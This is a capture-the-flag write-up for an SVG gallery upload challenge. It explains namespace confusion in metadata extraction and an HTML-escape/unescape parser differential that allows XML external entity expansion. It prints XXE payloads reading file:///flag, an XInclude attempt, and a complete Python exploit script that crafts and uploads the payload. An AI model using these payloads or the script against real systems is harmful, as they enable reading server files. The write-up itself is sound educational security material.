      Challenge Overview

      The challenge presents a web gallery where users can upload SVG artwork. Each uploaded file is processed server-side: the SVG gets validated, and then metadata (title, description, dimensions) is extracted and displayed on the gallery page. The key observation is that the output renders into three specific HTML sinks:

      html
      <h2>some title</h2>
<p>some description</p>
<dd>700 x 160</dd>

      The challenge description says "The new gallery opens tonight." Three hints are provided that point toward a two-stage parsing pipeline with a differential vulnerability between the stages. Understanding how each stage interprets the uploaded file is the crux of this challenge.

      Hint 1

      Two curators inspect each piece: one hangs the painting (carefully), the other writes the label (sloppily).

      Hint 2

      The gatekeeper only checks that your file looks like an SVG at the top. The label writer takes the first title/desc it sees by name, ignoring true namespace.

      Hint 3

      Don't look for hidden rooms, change how your art is "wrapped"! Payload must survive two interpretations: harmless text vs. XML.

      Bug: Namespace Confusion

      The label parser extracts metadata by searching for elements named title and desc without verifying their XML namespace. This means we can inject elements with a fake namespace that the label writer will still match. The SVG validation stage accepts them because they belong to a different namespace and don't violate SVG structural rules.

      xml
      <svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
  <metadata>
    <x:title xmlns:x="urn:not-svg">INJECTED_TITLE</x:title>
    <x:desc xmlns:x="urn:not-svg">INJECTED_DESC</x:desc>
  </metadata>
  <title>SAFE_TITLE</title>
  <desc>SAFE_DESC</desc>
</svg>

      The server renders:

      output
      h2: 'INJECTED_TITLE'
p : 'INJECTED_DESC'

      This confirms the parser uses a namespace-blind selector — likely find("title") or //*[local-name()="title"]. We can control the label content freely, but this alone doesn't yield the flag. We need a way to introduce dynamic content expansion.

      Dead Ends

      Raw DOCTYPE Doesn't Expand

      Since we control the label, the natural next step is XML entity expansion. We try uploading a document with an internal entity declaration:

      xml
      <!DOCTYPE svg [
  <!ENTITY e "ENTITY_OK">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <metadata>
    <x:title xmlns:x="urn:not-svg">&e;</x:title>
  </metadata>
</svg>

      The output is devastating:

      output
      h2: '&e;'

      The entity reference &e; is not expanded. The parser treats it as a literal string. This is a major trap that leads many solvers to conclude that entity expansion is simply impossible on this server.

      External XXE and XInclude Blocked

      With internal entities failing, we explore alternative XXE vectors. Every one of them hits a wall:

      • External Entity — <!ENTITY xxe SYSTEM "file:///flag"> returns nothing. File access via external entities is completely disabled.
      • OOB Parameter Entities — We set up a listener on webhook.site and used parameter entity references to exfiltrate data. No callback was ever received, confirming outbound network access is blocked.
      • XInclude — <xi:include href="file:///flag" parse="text"/> is not processed by the parser. XInclude support is not enabled.

      External entity loading is comprehensively disabled. This is not a standard "read /flag with XXE" challenge.

      Not SSTI or Multipart Confusion

      The hint about "wrapping" leads us to test content-type confusion:

      • Multipart tricks — Sending both a text field and a file field, duplicate file parts, switching Content-Transfer-Encoding between base64 and quoted-printable. The application consistently uses the real file part and rejects base64-encoded content.
      • SSTI — Uploading a label containing {{7*7}} or ${7*7} results in the template expression being printed literally. No server-side template injection.

      Every straightforward attack vector fails. The solution requires a deeper understanding of the two-stage processing pipeline.

      Breakthrough: Parser Differential

      Returning to Hint 3 — "Payload must survive two interpretations: harmless text vs. XML" — the key insight is that the two processing stages interpret the same data differently. The gatekeeper (stage 1) validates the upload, while the label writer (stage 2) parses it as XML. If we can make the same bytes look like harmless text to the gatekeeper but valid XML after decoding, we bypass the validation entirely.

      The breakthrough is HTML-encoding. If we HTML-escape the entire XML document before uploading, the gatekeeper sees only escaped text — no XML tags, no DOCTYPE, nothing suspicious. But the backend calls html.unescape() before passing the content to the XML parser, reconstructing the original XML with all its entity declarations intact.

      Consider this HTML-escaped document:

      text
      &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;700&quot; height=&quot;160&quot;&gt;
  &lt;metadata&gt;
    &lt;x:title xmlns:x=&quot;urn:not-svg&quot;&gt;WHOLE_TITLE&lt;/x:title&gt;
  &lt;/metadata&gt;
&lt;/svg&gt;

      The gatekeeper inspects this and sees only escaped HTML entities — no XML structure, nothing to validate or reject. It lets the upload through. Then the backend performs html.unescape(), which reconstructs the original well-formed SVG document. The XML parser receives clean, valid XML and processes it normally.

      Info — Parser Differential

      This class of vulnerability occurs when two components process the same input differently. The gatekeeper treats the raw bytes as text (seeing no XML structure), while the label writer first unescapes and then parses as XML (seeing a complete document with entities). This gap is what makes the exploit possible.

      Final Exploit

      Payload Construction

      Because the HTML-unescape step happens before XML parsing, we can now place a DOCTYPE declaration at the very start of the document — the only position where it's valid in XML. After unescaping, the XML parser sees a proper DTD with entity definitions and expands them accordingly.

      The complete payload before HTML-escaping:

      xml
      <!DOCTYPE svg [
  <!ENTITY flag SYSTEM "file:///flag">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
  <metadata>
    <x:title xmlns:x="urn:not-svg">&flag;</x:title>
    <x:desc xmlns:x="urn:not-svg">Opening Night Gallery</x:desc>
  </metadata>
  <title>Safe Title</title>
  <desc>Safe Description</desc>
  <rect width="100%" height="100%" fill="white"/>
</svg>

      Exploit Flow

      1. HTML-escape the entire XML document above — every <, >, &, and quote character gets converted to its HTML entity equivalent.
      2. Upload the escaped content as image/svg+xml.
      3. Gatekeeper sees only escaped text — no XML structure, passes validation.
      4. Backend calls html.unescape() on the stored content before parsing.
      5. XML parser receives the clean document with DOCTYPE and entity declarations.
      6. Entity expansion — &flag; resolves to the contents of /flag.
      7. Label parser extracts the expanded entity value as the title.

      Exploit Code

      python
      #!/usr/bin/env python3
"""
TJCTF 2026 — Opening Night
Parser Differential via HTML-escape → unescape → XML entity expansion
Author: QA210
"""
import html
import re
import sys
import requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
FLAG_PAT = re.compile(r"tjctf\{[^}]+\}", re.IGNORECASE)


def craft_svg_payload():
    """Build the raw XML with DOCTYPE + external entity, then HTML-escape it."""
    raw_xml = (
        '<!DOCTYPE svg [\n'
        '  <!ENTITY flag SYSTEM "file:///flag">\n'
        ']>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">\n'
        '  <metadata>\n'
        '    <x:title xmlns:x="urn:not-svg">&flag;</x:title>\n'
        '    <x:desc xmlns:x="urn:not-svg">QA210 Gallery</x:desc>\n'
        '  </metadata>\n'
        '  <title>Safe</title>\n'
        '  <desc>Safe</desc>\n'
        '  <rect width="100%" height="100%" fill="white"/>\n'
        '</svg>\n'
    )
    # The critical step: HTML-escape the entire document once.
    # Gatekeeper sees escaped text; backend unescapes before XML parse.
    return html.escape(raw_xml, quote=True).encode("utf-8")


def find_upload_endpoint(session):
    """Discover the upload form action and file field name."""
    r = session.get(f"{TARGET}/")
    # Simple regex to find form action and input name
    action_m = re.search(r'action="([^"]*)"', r.text)
    field_m = re.search(r'name="([^"]*)".*type="file"', r.text)
    if not action_m or not field_m:
        # Fallback: try common paths
        return f"{TARGET}/upload", "file"
    return f"{TARGET}{action_m.group(1)}", field_m.group(1)


def main():
    session = requests.Session()
    action_url, field_name = find_upload_endpoint(session)
    payload = craft_svg_payload()

    print(f"[*] Target:  {TARGET}")
    print(f"[*] Action:  {action_url}")
    print(f"[*] Field:   {field_name}")
    print(f"[*] Payload: {len(payload)} bytes (HTML-escaped XML)")

    resp = session.post(
        action_url,
        files={field_name: ("opening.svg", payload, "image/svg+xml")},
        allow_redirects=True,
        timeout=30,
    )

    match = FLAG_PAT.search(resp.text)
    if match:
        print(f"[+] FLAG: {match.group(0)}")
    else:
        print("[-] Flag not found in response.")
        # Debug: show snippet
        for line in resp.text.splitlines():
            if "title" in line.lower() or "flag" in line.lower():
                print(f"    {line.strip()}")


if __name__ == "__main__":
    main()
